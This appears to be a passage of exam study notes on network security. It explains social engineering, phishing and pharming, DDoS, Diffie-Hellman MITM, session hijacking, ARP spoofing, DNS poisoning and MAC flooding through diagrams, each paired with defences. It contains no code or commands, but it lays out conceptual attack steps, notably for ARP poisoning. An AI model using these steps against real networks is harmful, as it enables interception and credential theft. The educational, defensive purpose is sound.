<!-- TOC START -->
**Table of Contents** — 15 subtopics · 32 theories

1. **[Social Engineering & Cyber Attacks](#social-engineering--cyber-attacks)**
   - [Social Engineering — Techniques and Prevention](#social-engineering--techniques-and-prevention)
   - [Phishing and Pharming](#phishing-and-pharming)
   - [Denial of Service (DoS) and DDoS Attacks](#denial-of-service-dos-and-ddos-attacks)
   - [Man-in-the-Middle (MITM) Attack and Session Hijacking](#man-in-the-middle-mitm-attack-and-session-hijacking)
   - [ARP Spoofing and DNS Poisoning](#arp-spoofing-and-dns-poisoning)
   - [Layer 2 Attacks — MAC Flooding and DHCP Starvation](#layer-2-attacks--mac-flooding-and-dhcp-starvation)
   - [Active vs Passive Attacks, and Types of Attacker](#active-vs-passive-attacks-and-types-of-attacker)
   - [The Major Cyber Attacks — A Master List](#the-major-cyber-attacks--a-master-list)

2. **[Cryptography](#cryptography)**
   - [Cryptography, Encryption and Decryption](#cryptography-encryption-and-decryption)
   - [Symmetric vs Asymmetric Encryption](#symmetric-vs-asymmetric-encryption)
   - [The RSA Algorithm](#the-rsa-algorithm)
   - [Hashing, and How It Differs from Encryption](#hashing-and-how-it-differs-from-encryption)
   - [Identifying Algorithm Types, DES and Key Management](#identifying-algorithm-types-des-and-key-management)

3. **[Firewalls & Network Defense](#firewalls--network-defense)**
   - [Firewall — Concept, Types and Placement](#firewall--concept-types-and-placement)
   - [DMZ, Proxy Server and Network Segmentation](#dmz-proxy-server-and-network-segmentation)
   - [IDS, IPS and Defence in Depth](#ids-ips-and-defence-in-depth)

4. **[Malware & Security Threats](#malware--security-threats)**
   - [Malware — Types and Characteristics](#malware--types-and-characteristics)

5. **[Web Security Vulnerabilities](#web-security-vulnerabilities)**
   - [SQL Injection](#sql-injection)
   - [Cross-Site Scripting (XSS) and CSRF](#cross-site-scripting-xss-and-csrf)
   - [Securing a Web Server and a Web Application](#securing-a-web-server-and-a-web-application)

6. **[Authentication & Access Control](#authentication--access-control)**
   - [Authentication, Authorization and Multi-Factor Authentication](#authentication-authorization-and-multi-factor-authentication)
   - [Digital Signatures and Digital Certificates](#digital-signatures-and-digital-certificates)

7. **[Security Principles (CIA Triad)](#security-principles-cia-triad)**
   - [The CIA Triad and Security Principles](#the-cia-triad-and-security-principles)

8. **[Security Protocols (SSL/TLS, HTTPS)](#security-protocols-ssltls-https)**
   - [SSL, TLS and HTTPS](#ssl-tls-and-https)

9. **[Cyber Crime & Security](#cyber-crime--security)**
   - [Cyber Security, Cyber Crime and Cyber Space](#cyber-security-cyber-crime-and-cyber-space)

10. **[VPN & Tunneling Protocols (IPsec, SSL VPN)](#vpn--tunneling-protocols-ipsec-ssl-vpn)**
   - [VPN — Concept, Types and Working](#vpn--concept-types-and-working)

11. **[Critical Information Infrastructure (CII) & Cyber Governance](#critical-information-infrastructure-cii--cyber-governance)**
   - [Critical Information Infrastructure and Cyber Law in Bangladesh](#critical-information-infrastructure-and-cyber-law-in-bangladesh)

12. **[Cryptography & Network Security Scenarios](#cryptography--network-security-scenarios)**
   - [Designing a Secure Transmission Protocol](#designing-a-secure-transmission-protocol)

13. **[Cryptography & Network Security](#cryptography--network-security)**
   - [Banking Security — Key Measures in a Modern Bank](#banking-security--key-measures-in-a-modern-bank)
   - [Firewall Types — WPA vs a Network Firewall](#firewall-types--wpa-vs-a-network-firewall)

14. **[Email & Messaging Security (Spam, Phishing)](#email--messaging-security-spam-phishing)**
   - [Email Security — Spam, Phishing and Protection](#email-security--spam-phishing-and-protection)

15. **[Buffer Overflow & Software Vulnerabilities](#buffer-overflow--software-vulnerabilities)**
   - [Buffer Overflow Attack](#buffer-overflow-attack)

<!-- TOC END -->

---

## Social Engineering & Cyber Attacks

### Social Engineering — Techniques and Prevention

**Social engineering** is the art of **manipulating people psychologically into revealing confidential information or performing actions that compromise security**. Instead of breaking the technology, the attacker **breaks the human being**.

> **The core idea:** *"Why spend a week cracking a password when you can just phone someone and ask for it?"*
> Humans are the **weakest link** in any security system — you can patch software, but you cannot patch a person.

#### The psychological principles exploited

| Principle | How it is used |
|---|---|
| **Authority** | Pretending to be the boss, an IT administrator, a police officer or a bank official |
| **Urgency / Scarcity** | *"Your account will be closed in 2 hours!"* — panic prevents careful thinking |
| **Fear** | *"Your computer is infected — call this number immediately"* |
| **Trust / Familiarity** | Posing as a colleague, a vendor or a friend |
| **Greed** | *"You have won a lottery / a free iPhone"* |
| **Helpfulness** | People naturally want to assist someone who appears to be in trouble |
| **Social proof** | *"Everyone in your department has already updated their password"* |

#### The attack lifecycle

```mermaid
flowchart LR
    A["1 . RESEARCH<br/>gather information about the target<br/>(LinkedIn, Facebook, company website)"] --> B["2 . HOOK<br/>make contact and build trust"]
    B --> C["3 . PLAY<br/>exploit the trust to extract<br/>information or action"]
    C --> D["4 . EXIT<br/>withdraw without arousing suspicion"]
```

#### Common social engineering techniques

| # | Technique | Description | Example |
|---|---|---|---|
| 1 | **Phishing** | Mass fraudulent emails/messages that appear to come from a trusted source | A fake "your bank account is locked" email |
| 2 | **Spear phishing** | Phishing **targeted at a specific individual**, using personal details | An email to an accountant naming their actual manager |
| 3 | **Whaling** | Spear phishing aimed at **senior executives** (CEO, CFO) | A fake legal subpoena to the Managing Director |
| 4 | **Vishing** (Voice phishing) | Fraud **over a phone call** | *"I'm calling from bKash — tell me the OTP to verify your account"* |
| 5 | **Smishing** (SMS phishing) | Fraud via **SMS** | *"You have won 50,000 Tk — click this link"* |
| 6 | **Pretexting** | Inventing a **believable false scenario** to obtain data | Posing as an auditor who "needs" the employee list |
| 7 | **Baiting** | Leaving infected media or offering something tempting | A **USB drive labelled "Salary 2026"** left in the office car park |
| 8 | **Quid pro quo** | Offering a service in return for information | *"I'm from IT support — give me your password and I'll fix your slow PC"* |
| 9 | **Tailgating / Piggybacking** | **Physically following** an authorised person through a secure door | Carrying boxes so someone holds the door open |
| 10 | **Shoulder surfing** | Watching someone type a PIN or password | At an ATM or in a café |
| 11 | **Dumpster diving** | Searching discarded papers and devices for information | Finding printed account lists in the rubbish |
| 12 | **Watering hole** | Compromising a website the target group is known to visit | Infecting a professional association's site |
| 13 | **Business Email Compromise (BEC)** | Impersonating an executive to authorise a fraudulent payment | *"Urgent: transfer 50 lakh to this supplier account today"* |
| 14 | **Scareware** | Fake warnings pushing the victim to install malware | *"Your PC has 5 viruses! Download our cleaner"* |

#### How to prevent social engineering

**People (the most important layer)**
1. **Regular security-awareness training** and **simulated phishing tests** for every employee.
2. **Verify independently** — call back on a **known official number**, never the one in the message.
3. **Never share passwords, PINs or OTPs** with anyone, including "IT support" or "the bank" — legitimate organisations never ask.
4. Cultivate a culture where **questioning and reporting is rewarded**, not treated as rudeness.

**Process**
5. **Clear, documented procedures** for payments and data release — a **dual-approval / call-back rule** for large transfers.
6. **Least privilege** — people can only reach what their job requires.
7. **Clean-desk and secure-disposal** policies; **shred** documents.
8. A simple, well-known **incident reporting channel**.

**Technology**
9. **Multi-Factor Authentication (MFA)** — even a stolen password is then insufficient.
10. **Email security gateway** with anti-phishing, **SPF/DKIM/DMARC**, and external-sender banners.
11. **Web filtering** and DNS protection against known malicious sites.
12. **Endpoint protection (EDR)** and **disabled USB auto-run**.
13. **Physical access control** — badges, mantraps, CCTV, visitor escorting.
14. **Monitoring and logging** to detect unusual access after a successful attack.

**Previous Year Question List from this Topic:**

- [Write down the 10 most Cyber attacks. Difference among Black Hat hacker, Grey hat hacker and white hat hacker.](../written-answers/computer-network-security.md?plain=1#L310)
- [Phishing attack এর মাধ্যমে কীভাবে attack করা হয়। উহার কারণে কি ক্ষতি হতে পারে?](../written-answers/computer-network-security.md?plain=1#L714)
- [What is social engineering? What is hashing? How is it different from encryption?](../written-answers/computer-network-security.md?plain=1#L1042)


---

### Phishing and Pharming

#### What is a phishing attack?

**Phishing** is a **social-engineering attack in which an attacker sends a fraudulent message that appears to come from a trusted source, in order to trick the victim into revealing sensitive information (passwords, card numbers, OTP) or installing malware.**

The name is a play on "fishing" — the attacker **casts bait** and waits for someone to bite.

#### How a phishing attack is carried out

```mermaid
flowchart TD
    A["1 . The attacker creates a FAKE website<br/>that clones the real bank's login page"] --> B["2 . Sends a mass EMAIL/SMS<br/>'Your account is suspended — verify now'"]
    B --> C["3 . The victim clicks the link<br/>(the URL looks almost right: dutchbangIa.com)"]
    C --> D["4 . The fake page asks for<br/>username, password, card number, OTP"]
    D --> E["5 . The victim enters the credentials —<br/>they go STRAIGHT to the attacker"]
    E --> F["6 . The victim is redirected to the REAL site<br/>so nothing seems wrong"]
    F --> G["7 . The attacker logs in and<br/>DRAINS the account"]
```

#### Types of phishing

| Type | Target | Medium |
|---|---|---|
| **Email phishing** | Mass, untargeted | Email |
| **Spear phishing** | **One specific person**, using researched details | Email |
| **Whaling** | **Senior executives** | Email |
| **Vishing** | Anyone | **Voice call** |
| **Smishing** | Anyone | **SMS** |
| **Clone phishing** | Anyone | A **copy of a real email** the victim already received, with the attachment swapped |
| **Angler phishing** | Anyone | **Fake social-media support accounts** |
| **Pharming** | Anyone | **DNS manipulation** — no click needed |
| **Search-engine phishing** | Anyone | Fake sites promoted in search results/ads |

#### How to recognise a phishing message

1. **Urgency and threats** — "act within 24 hours or your account closes".
2. **Generic greeting** — "Dear Customer" instead of your name.
3. **Spelling and grammar mistakes**.
4. **A suspicious sender address** — `service@dbbl-secure.xyz` rather than the bank's real domain.
5. **A mismatched link** — hover over it; the displayed text and the real URL differ.
6. **Requests for credentials, OTP, PIN or card details** — legitimate organisations **never** ask.
7. **Unexpected attachments**, especially `.exe`, `.zip`, `.scr` or macro-enabled documents.
8. **Too-good-to-be-true offers**.

#### Prevention of phishing

**For users:** never click links in unsolicited messages — **type the address yourself**; **verify by calling** the official number; check for **HTTPS and the correct domain**; **never share OTP/PIN**; keep the browser and antivirus updated; and **report** suspicious mail.

**For organisations:** deploy an **email security gateway** with anti-phishing filtering; implement **SPF, DKIM and DMARC** so that attackers cannot spoof your domain; enforce **MFA** everywhere; run **simulated phishing campaigns** and training; use **web/DNS filtering**; flag **external** senders visually; enable **browser anti-phishing** features; and monitor for **lookalike domain registrations**.

#### Phishing vs Pharming

| Point | **Phishing** | **Pharming** |
|---|---|---|
| **Method** | Sends a **fraudulent message with a malicious link** — the victim must be **tricked into clicking** | **Redirects the victim automatically** by corrupting DNS resolution or the hosts file |
| **Requires user action?** | ✅ **Yes** — the victim must click or reply | ❌ **NO** — the victim types the **correct** address and is still sent to the fake site |
| **Attack vector** | Email, SMS, phone, social media | **DNS server poisoning**, malware altering the local **hosts file**, a compromised router |
| **Scale** | One message per victim (though sent in bulk) | **One poisoned DNS server redirects THOUSANDS** of users at once |
| **Detection by the user** | Possible — a careful user spots the wrong URL | **Very hard** — the address bar shows the **correct** URL |
| **Analogy** | Sending a fake letter with a wrong address on it | **Secretly changing the street signs** so everyone driving to the bank arrives at a fake one |
| **Example** | An email: *"Click here to verify your DBBL account"* leading to `dbbI-verify.com` | The user types `www.dbbl.com.bd` correctly, but a poisoned DNS entry sends them to the attacker's server |
| **Main defence** | **User awareness**, email filtering, MFA | **DNSSEC**, secured DNS servers, patched routers, anti-malware, **checking the TLS certificate** |

> **Why pharming is more dangerous:** it defeats the standard advice of "type the address yourself". The only reliable defence left to the user is to **check that the HTTPS certificate is valid and issued to the right organisation** — a pharming site cannot obtain a valid certificate for the real bank's domain.

**Previous Year Question List from this Topic:**

- [What is a phishing attack? Explain its types and discuss methods to prevent it.](../written-answers/computer-network-security.md?plain=1#L28)
- [Briefly explain phishing attack and denial-of-service (DoS) attack.](../written-answers/computer-network-security.md?plain=1#L197)
- [(b) Distinguish between phishing and pharming. Give examples to explain.](../written-answers/computer-network-security.md?plain=1#L653)
- [Phishing attack এর মাধ্যমে কীভাবে attack করা হয়। উহার কারণে কি ক্ষতি হতে পারে?](../written-answers/computer-network-security.md?plain=1#L714)
- [If you downloaded the email, you will be able to face the problem. Which attack do you face?](../written-answers/computer-network-security.md?plain=1#L5715)
- [e) What is email? What precautions can be taken to prevent unnecessary and unwanted e-mails?](../written-answers/computer-network-security.md?plain=1#L5742)


---

### Denial of Service (DoS) and DDoS Attacks

#### What is a DoS attack?

A **Denial of Service (DoS) attack** is an attack that attempts to make a **machine, service or network resource UNAVAILABLE to its legitimate users**, by flooding it with traffic or sending requests that trigger a crash.

> The attacker does **not** steal or modify data — the goal is purely **disruption: availability**, the "A" of the CIA triad.

#### DoS vs DDoS

```mermaid
flowchart LR
    subgraph DOS["DoS — Denial of Service"]
        A1["ONE attacker machine"] -->|"flood of traffic"| S1["Target server<br/>❌ overwhelmed"]
    end
    subgraph DDOS["DDoS — Distributed Denial of Service"]
        H["Attacker<br/>(Botmaster)"] --> C["Command & Control server"]
        C --> B1["Bot 1"]
        C --> B2["Bot 2"]
        C --> B3["Bot 3"]
        C --> BN["Bot … 100,000<br/>(the BOTNET / zombie army)"]
        B1 --> S2["Target server<br/>❌ overwhelmed"]
        B2 --> S2
        B3 --> S2
        BN --> S2
    end
```

| Point | **DoS** | **DDoS** |
|---|---|---|
| **Number of attacking sources** | **ONE** machine / one IP | **MANY thousands** of compromised machines (a **botnet**) |
| **Traffic volume** | Limited by one machine's bandwidth | **Enormous** — terabits per second |
| **Blocking it** | **Easy** — block the single source IP | **Very hard** — traffic comes from millions of legitimate-looking IPs worldwide |
| **Tracing the attacker** | Relatively easy | **Very difficult** — the real attacker hides behind the bots |
| **Speed of impact** | Slower | **Very fast** |
| **Complexity** | Simple | Requires building or renting a botnet |
| **Damage potential** | Moderate | **Severe** — can take down major services |
| **Example** | A single flood tool run from one PC | The **Mirai botnet (2016)**, built from IoT cameras, which took down Dyn DNS and much of the US internet |

#### How a DDoS attack works — the mechanism

1. **Build the botnet.** The attacker infects thousands of computers, routers, cameras and IoT devices with malware, turning them into **bots (zombies)**. Their owners have no idea.
2. **Command and Control (C&C).** All bots connect to the attacker's C&C server and wait for instructions.
3. **Launch.** The attacker issues one command; **every bot simultaneously floods the target** with requests.
4. **Saturation.** The target's bandwidth, connection table, CPU or memory is exhausted.
5. **Denial.** Legitimate users get timeouts — the service is effectively down.

#### Types of DDoS attack

| Layer | Type | Mechanism | Examples |
|---|---|---|---|
| **Volumetric** (most common) | Saturate the **bandwidth** | Send more gigabits than the pipe can carry | **UDP flood, ICMP/Ping flood, DNS amplification, NTP amplification** |
| **Protocol / State-exhaustion** | Exhaust **server or firewall connection tables** | Abuse protocol behaviour | **SYN flood**, Ping of Death, Smurf attack, fragmented packet attacks |
| **Application layer (L7)** | Exhaust **application resources** | Send requests that look legitimate but are expensive | **HTTP flood**, Slowloris, expensive database queries |

**The SYN flood explained** — the classic protocol attack:

```mermaid
sequenceDiagram
    participant A as Attacker (spoofed IPs)
    participant S as Server
    A->>S: SYN (from a FAKE source IP)
    S->>A: SYN-ACK (sent to the fake IP — goes nowhere)
    Note over S: The server allocates memory and<br/>WAITS for the final ACK that never comes
    A->>S: SYN (another fake IP)
    S->>A: SYN-ACK …
    Note over S: Thousands of half-open connections<br/>fill the backlog queue → ❌ no room for<br/>legitimate users
```

**DNS amplification** — the attacker sends a **small** DNS query (60 bytes) with the **victim's IP spoofed as the source**, to thousands of open DNS resolvers. Each replies with a **large** answer (4000 bytes) sent to the victim. A **70× amplification factor** turns a modest attacker into a massive flood.

#### Impact of a DoS/DDoS attack

Service downtime and lost revenue · reputational damage and customer loss · staff diverted to incident response · SLA penalties · **smokescreen** — DDoS is often used to distract the security team while a **data theft** happens elsewhere · regulatory consequences for a bank.

#### Prevention and mitigation

| Measure | How it helps |
|---|---|
| **DDoS protection service / scrubbing centre** | Cloudflare, Akamai, AWS Shield absorb and filter the flood before it reaches you |
| **Over-provisioned bandwidth** | Buys time to respond |
| **Rate limiting** | Cap requests per IP per second |
| **CDN** | Distributes load across a global network |
| **Load balancers and auto-scaling** | Spread the traffic; add capacity automatically |
| **Firewall and IPS rules** | Drop malformed and known-bad traffic |
| **SYN cookies** | Defeat SYN floods without allocating memory |
| **Blackhole / sinkhole routing** | Drop attack traffic upstream at the ISP |
| **Anycast** | Spread the attack across many data centres |
| **Disable open resolvers/reflectors** | Prevents your own servers being used for amplification |
| **Ingress filtering (BCP 38)** at the ISP | Blocks spoofed source addresses at the network edge |
| **An incident response plan** | Know who to call at the ISP at 3 a.m. |
| **Traffic-baseline monitoring** | Detect the anomaly in the first minutes |

**Previous Year Question List from this Topic:**

- [What is a DoS attack? Explain the mechanism of a DDoS attack and how it differs from a simple DoS attack.](../written-answers/computer-network-security.md?plain=1#L125)
- [Briefly explain phishing attack and denial-of-service (DoS) attack.](../written-answers/computer-network-security.md?plain=1#L197)
- [What is Cyber Security? Write down the top 10 cyber attack. Discuss about Ransomware and DDoS attack.](../written-answers/computer-network-security.md?plain=1#L341)
- [What is meant by Encryption and Decryption? What is Cyber security? Write down the top 10 cyber attack.](../written-answers/computer-network-security.md?plain=1#L370)
- [What is Denial of Service (DoS) is and NAT?](../written-answers/computer-network-security.md?plain=1#L488)
- [What do you understand by DOS attack and Man-in-the-middle attack? Please explain how it can be occurred?](../written-answers/computer-network-security.md?plain=1#L507)
- [What is DDoS and SQL Injection attack?](../written-answers/computer-network-security.md?plain=1#L678)
- [Briefly describe about DoS, IP address spoofing and Man-in-the-middle attacks.](../written-answers/computer-network-security.md?plain=1#L942)


---

### Man-in-the-Middle (MITM) Attack and Session Hijacking

#### What is a MITM attack?

A **Man-in-the-Middle (MITM)** attack is one in which the attacker **secretly positions themselves between two communicating parties**, **intercepting and possibly altering** the traffic, while both parties believe they are talking directly and securely to each other.

```mermaid
flowchart LR
    subgraph NORMAL["Normal communication"]
        A1["Alice"] <--> B1["Bank server"]
    end
    subgraph MITM["Man-in-the-Middle"]
        A2["Alice"] <-->|"thinks she is<br/>talking to the bank"| M["🕵️ ATTACKER<br/>reads and MODIFIES<br/>everything"]
        M <-->|"pretends to be Alice"| B2["Bank server"]
    end
```

#### How a MITM attack is performed

| Technique | Mechanism |
|---|---|
| **ARP spoofing** | On a LAN, the attacker poisons the ARP cache so traffic is routed through their machine |
| **Rogue / Evil-twin Wi-Fi** | The attacker runs a free access point named "Airport_Free_WiFi"; everyone who connects sends traffic through them |
| **DNS spoofing** | The victim is directed to the attacker's server |
| **SSL stripping** | The attacker downgrades an HTTPS connection to plain HTTP |
| **Fake / rogue certificate** | A forged or fraudulently issued TLS certificate |
| **IP spoofing and session hijacking** | Taking over an established connection |
| **BGP hijacking** | Re-routing whole networks at the internet backbone level |

#### MITM on the Diffie-Hellman key exchange — the classic worked example

**Diffie-Hellman (DH)** lets two parties agree a shared secret over a public channel. Its fatal weakness in its **plain, unauthenticated** form is that **neither party can verify who they are talking to**.

**Normal Diffie-Hellman:** Alice and Bob agree public values **p** (a large prime) and **g** (a generator). Alice picks a secret **a** and sends **A = gᵃ mod p**; Bob picks a secret **b** and sends **B = gᵇ mod p**. Alice computes **Bᵃ = g^(ab)**, Bob computes **Aᵇ = g^(ab)** — the **same shared key**, which an eavesdropper cannot derive (the discrete logarithm problem).

**The attack:**

```mermaid
sequenceDiagram
    participant A as Alice
    participant M as Mallory (attacker)
    participant B as Bob
    A->>M: A = g^a mod p  (intended for Bob)
    Note over M: Mallory INTERCEPTS it and<br/>generates her own secret m
    M->>B: M1 = g^m mod p  (pretending to be Alice)
    B->>M: B = g^b mod p  (intended for Alice)
    Note over M: Mallory intercepts this too
    M->>A: M1 = g^m mod p  (pretending to be Bob)
    Note over A: Alice computes K1 = (g^m)^a = g^(am)
    Note over B: Bob computes  K2 = (g^m)^b = g^(bm)
    Note over M: Mallory knows BOTH:<br/>K1 = (g^a)^m and K2 = (g^b)^m
    A->>M: Message encrypted with K1
    Note over M: Decrypt with K1 → READ / ALTER → re-encrypt with K2
    M->>B: Message encrypted with K2
```

**The result:** Alice shares key **K1** with Mallory, and Bob shares key **K2** with Mallory. **Neither knows.** Mallory decrypts everything with one key, reads or modifies it, and re-encrypts with the other. Both parties see a perfectly working encrypted session.

**The defence — AUTHENTICATED Diffie-Hellman:**
1. **Digital signatures** — each party signs their DH public value with their private key, so the other can verify it really came from them. *(This is what TLS does.)*
2. **Digital certificates from a trusted CA**, binding the public key to a verified identity.
3. **Station-to-Station (STS) protocol** — DH with mutual signature authentication.
4. **Pre-shared keys** or a **password-authenticated key exchange (PAKE)**.
5. **Out-of-band verification** of a key fingerprint (as Signal and WhatsApp offer).

> **The lesson to state in the exam:** *Diffie-Hellman provides **confidentiality against a passive eavesdropper**, but **no authentication**. Without authentication it is completely broken by an active man-in-the-middle. Encryption without authentication is not security.*

#### Session hijacking

**Session hijacking** is the attack in which an attacker **takes over a valid, already-authenticated session** between a user and a server by stealing or predicting the **session ID / session cookie** — gaining access **without ever knowing the password**.

```mermaid
flowchart LR
    A["User logs in<br/>with username + password"] --> B["Server issues a<br/>SESSION ID cookie"]
    B --> C["🕵️ Attacker STEALS the session ID<br/>(sniffing, XSS, malware, prediction)"]
    C --> D["Attacker sends requests<br/>carrying the stolen session ID"]
    D --> E["❌ The server believes the attacker<br/>IS the logged-in user"]
```

**How the session ID is stolen:** **packet sniffing** on an unencrypted or shared network · **XSS** (JavaScript reading `document.cookie`) · **session fixation** (forcing a known ID on the victim before they log in) · **predictable session IDs** (sequential or weakly random) · **malware/browser extensions** · **MITM**.

**Prevention:**
1. **Use HTTPS everywhere** — encrypt the whole session so cookies cannot be sniffed.
2. Set cookies as **`Secure`** (HTTPS only), **`HttpOnly`** (unreadable by JavaScript, defeating XSS theft) and **`SameSite`**.
3. Generate **long, cryptographically random session IDs**.
4. **Regenerate the session ID on login** — defeats session fixation.
5. Enforce **session timeout** and idle expiry; log out properly (invalidate server-side).
6. Bind the session to the **IP address and user-agent** and re-authenticate on change.
7. Require **re-authentication** for sensitive actions (a fund transfer).
8. **MFA**, and monitoring for concurrent sessions from different countries.

#### Countermeasures against MITM generally

| Measure | Protects by |
|---|---|
| **Strong encryption — TLS 1.3 / HTTPS everywhere** | The attacker sees only ciphertext |
| **Certificate validation and HSTS** | Prevents SSL stripping and fake certificates |
| **Certificate pinning** | The app accepts only its own known certificate |
| **VPN on untrusted networks** | Tunnels everything past a hostile Wi-Fi |
| **Avoid public/open Wi-Fi** for sensitive work | Removes the easiest attack position |
| **Mutual authentication** | Both sides prove identity |
| **Dynamic ARP Inspection + DHCP snooping** on switches | Blocks ARP poisoning on the LAN |
| **DNSSEC** | Prevents DNS spoofing |
| **MFA** | A stolen password alone is useless |

**Previous Year Question List from this Topic:**

- [What is a Man-in-the-Middle (MITM) attack? Describe two countermeasures to prevent it.](../written-answers/computer-network-security.md?plain=1#L93)
- [What is a Man-inThe Middle (MitM) attack? How can it be prevented?](../written-answers/computer-network-security.md?plain=1#L166)
- [How to attack DHCP server in MIMA?](../written-answers/computer-network-security.md?plain=1#L216)
- [Describe a man-in the middle attack on the Diffie-Hellman key exchange protocol in which the adversary generates two public key pairs for the attack.](../written-answers/computer-network-security.md?plain=1#L411)
- [What do you understand by DOS attack and Man-in-the-middle attack? Please explain how it can be occurred?](../written-answers/computer-network-security.md?plain=1#L507)
- [Explain ARP Spoofing attack with diagram. Why ARP spoofing attacker used to launch Man-in-the-Middle attack.](../written-answers/computer-network-security.md?plain=1#L745)
- [(d) Explain the principle of man in the middle and session hijacking attack with appropriate diagrams.](../written-answers/computer-network-security.md?plain=1#L854)
- [Briefly describe about DoS, IP address spoofing and Man-in-the-middle attacks.](../written-answers/computer-network-security.md?plain=1#L942)
- [What is session hijacking and how to encrypt username and password in PHP?](../written-answers/computer-network-security.md?plain=1#L3619)


---

### ARP Spoofing and DNS Poisoning

#### What is ARP?

**ARP (Address Resolution Protocol)** maps a known **IP address** to the **MAC (hardware) address** on a local network. A host broadcasts *"Who has 192.168.1.1?"* and the owner replies *"I do — my MAC is AA:BB:CC:DD:EE:FF."* The answer is stored in the **ARP cache**.

**The fundamental flaw: ARP is STATELESS and has NO AUTHENTICATION.** A host will accept and cache **any ARP reply**, even one it never asked for (a *gratuitous* ARP), and will happily overwrite an existing entry.

#### ARP spoofing / ARP poisoning

The attacker **sends forged ARP replies** claiming that **the gateway's IP belongs to the attacker's MAC address**, and simultaneously tells the gateway that **the victim's IP belongs to the attacker's MAC**. Both now send their traffic to the attacker.

```mermaid
flowchart TD
    subgraph BEFORE["Normal ARP"]
        V1["Victim<br/>192.168.1.10"] -->|"traffic"| G1["Gateway<br/>192.168.1.1<br/>MAC: GG:GG"]
        G1 --> I1["Internet"]
    end
    subgraph AFTER["After ARP poisoning"]
        V2["Victim<br/>192.168.1.10<br/>ARP cache: 192.168.1.1 → AA:AA ❌"] -->|"all traffic"| AT["🕵️ ATTACKER<br/>MAC: AA:AA<br/>forwards + reads everything"]
        AT --> G2["Gateway<br/>192.168.1.1<br/>ARP cache: 192.168.1.10 → AA:AA ❌"]
        G2 --> I2["Internet"]
        AT -.->|"sends forged ARP replies<br/>to BOTH sides"| V2
        AT -.-> G2
    end
```

**Step by step:**
1. The attacker joins the same LAN (an office Wi-Fi, a café, a compromised machine).
2. They scan to find the victim's and the gateway's IP and MAC addresses.
3. They send a **forged ARP reply to the victim**: *"192.168.1.1 (the gateway) is at AA:AA"* — the attacker's MAC.
4. They send a **forged ARP reply to the gateway**: *"192.168.1.10 (the victim) is at AA:AA"*.
5. Both caches are now poisoned; **all traffic in both directions flows through the attacker**.
6. The attacker enables **IP forwarding** so traffic still reaches its destination — the victim notices nothing.
7. The attacker now **sniffs passwords, injects content, strips SSL or modifies data**.

> ### "Why do attackers use ARP spoofing to launch a Man-in-the-Middle attack?"
> Because on a **switched** network an attacker normally sees **only their own traffic** — the switch forwards frames only to the correct port. ARP spoofing is the simplest way to **make the victim voluntarily send its traffic to the attacker**, placing the attacker *in the middle* of every conversation. It requires no password, no exploit and no privilege — only presence on the same LAN — which is why it is the **foundation of most LAN-based MITM, sniffing, session-hijacking and SSL-stripping attacks**.

**Prevention of ARP spoofing**

| Measure | How it helps |
|---|---|
| **Dynamic ARP Inspection (DAI)** on managed switches | The switch validates every ARP packet against a trusted DHCP snooping database and drops forgeries — **the primary defence** |
| **DHCP snooping** | Builds the trusted IP-to-MAC binding table that DAI uses |
| **Static ARP entries** | For critical servers and gateways — cannot be overwritten |
| **Port security** | Limits which MAC addresses may appear on a port |
| **Network segmentation / VLANs** | Confines an attacker to a small broadcast domain |
| **Encryption (HTTPS, SSH, VPN)** | Even if intercepted, the traffic is unreadable |
| **ARP monitoring tools** (arpwatch, XArp) | Alert when a MAC-to-IP mapping changes |
| **802.1X port authentication** | Stops unauthorised devices joining the LAN at all |

#### DNS poisoning / DNS spoofing / DNS cache poisoning

**DNS poisoning** is an attack in which **false DNS records are injected into a DNS resolver's cache**, so that queries for a legitimate domain return the **attacker's IP address**, silently redirecting users to a malicious site.

```mermaid
flowchart TD
    A["1 . The user types<br/>www.bank.com.bd"] --> B["2 . The request goes to the<br/>DNS resolver"]
    B --> C{"3 . Is the answer<br/>in the cache?"}
    C -->|"POISONED entry"| D["❌ Returns the ATTACKER'S IP<br/>203.0.113.66"]
    D --> E["4 . The browser connects to the<br/>attacker's FAKE bank website"]
    E --> F["5 . The user enters credentials —<br/>they go to the attacker"]
    G["🕵️ Attacker floods the resolver with<br/>forged responses carrying guessed<br/>transaction IDs, BEFORE the real<br/>server replies"] -.->|"poisons the cache"| C
```

**How it works:** DNS traditionally uses **UDP**, which is connectionless and easily spoofed. A response is accepted if it matches the **query's transaction ID and source port**. An attacker who can **guess or brute-force** those values and reply **faster than the real server** gets their forged answer cached — and it stays cached for the whole **TTL**, affecting **every user** of that resolver. (This is the **Kaminsky attack**, disclosed in 2008.)

**Other routes:** compromising the DNS server itself · altering the victim's **local hosts file** with malware · a **rogue DHCP server** handing out a malicious DNS address · a compromised home router.

**Impact:** mass redirection to phishing sites (**pharming**), malware distribution, censorship, email interception, and complete MITM.

**Prevention:**
1. **DNSSEC** — cryptographically signs DNS records so forged answers are rejected. **The definitive fix.**
2. **DNS over HTTPS (DoH) / DNS over TLS (DoT)** — encrypts and authenticates the query channel.
3. **Source-port randomisation** and random query IDs — makes guessing infeasible.
4. **Keep DNS software patched** (BIND, Unbound, Windows DNS).
5. **Restrict recursion** to internal clients; do not run an open resolver.
6. **Use trusted resolvers** and monitor for unexpected changes.
7. **Short TTLs** limit the damage window.
8. On the client side: **check the HTTPS certificate** — a poisoned site cannot present a valid one; and **scan for malware** that edits the hosts file.

**Previous Year Question List from this Topic:**

- [(b) What is an ARP poisoning attack, and how does it work?](../written-answers/computer-network-security.md?plain=1#L60)
- [What do you mean by a DNS poisoning attack, and how does it work?](../written-answers/computer-network-security.md?plain=1#L534)
- [Explain ARP Spoofing attack with diagram. Why ARP spoofing attacker used to launch Man-in-the-Middle attack.](../written-answers/computer-network-security.md?plain=1#L745)
- [Difference between spoofing and sniffing](../written-answers/computer-network-security.md?plain=1#L781)


---

### Layer 2 Attacks — MAC Flooding and DHCP Starvation

#### MAC flooding

**MAC flooding** is an attack against a **network switch**, in which the attacker floods it with a huge number of frames carrying **fake source MAC addresses**, in order to **overflow the switch's MAC address table (CAM table)**.

**Why it works:** a switch keeps a **CAM (Content Addressable Memory) table** mapping MAC addresses to ports, so it can forward frames only to the correct port. That table has a **fixed, finite size** (a few thousand to a few tens of thousands of entries).

```mermaid
flowchart TD
    A["1 . The attacker sends thousands of frames<br/>per second with RANDOM fake source MACs"] --> B["2 . The switch learns each one and<br/>fills its CAM table"]
    B --> C["3 . The CAM table OVERFLOWS —<br/>legitimate entries are pushed out"]
    C --> D["4 . The switch enters FAIL-OPEN mode<br/>and behaves like a HUB"]
    D --> E["5 . It BROADCASTS every frame<br/>out of EVERY port"]
